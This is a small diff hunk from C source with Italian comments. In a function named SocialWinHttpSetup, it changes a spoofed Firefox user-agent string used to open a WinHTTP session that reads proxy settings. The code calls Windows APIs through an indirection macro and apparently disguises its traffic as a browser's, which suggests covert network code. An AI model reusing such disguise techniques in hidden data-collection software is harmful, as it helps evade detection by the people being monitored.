@@ -121,7 +121,7 @@ void SocialWinHttpSetup(WCHAR *DestURL)
 	ZeroMemory(&ProxyConfig, sizeof(ProxyConfig));
 
 	// Crea una sessione per winhttp.
-    g_http_social_session = FNC(WinHttpOpen)( L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.2) Gecko/20100101 Firefox/10.0.2", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+    g_http_social_session = FNC(WinHttpOpen)( L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	// Cerca nel registry le configurazioni del proxy
 	if (g_http_social_session && FNC(WinHttpGetIEProxyConfigForCurrentUser)(&ProxyConfig)) {
